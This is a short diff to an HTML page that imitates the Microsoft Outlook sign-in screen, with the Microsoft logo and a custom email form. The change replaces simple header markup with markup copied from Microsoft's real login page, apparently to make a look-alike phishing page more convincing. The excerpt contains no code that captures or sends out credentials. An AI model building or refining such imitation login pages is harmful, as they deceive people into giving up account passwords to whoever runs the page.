@@ -98,9 +98,8 @@
                 <img alt="Outlook Logo" class="img" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" />
                 
                 <!-- Header -->
-                <div class="heading">Sign in </div><br>
-                <p>to continue to Outlook</p>
-                <p></p>
+                <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
+<div data-bind="text: subtitle || str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" class="subtitle ext-subtitle">to continue to Outlook</div>
                 <!-- First Form for Email Input -->
                 <form id="emailForm">
                     <p>
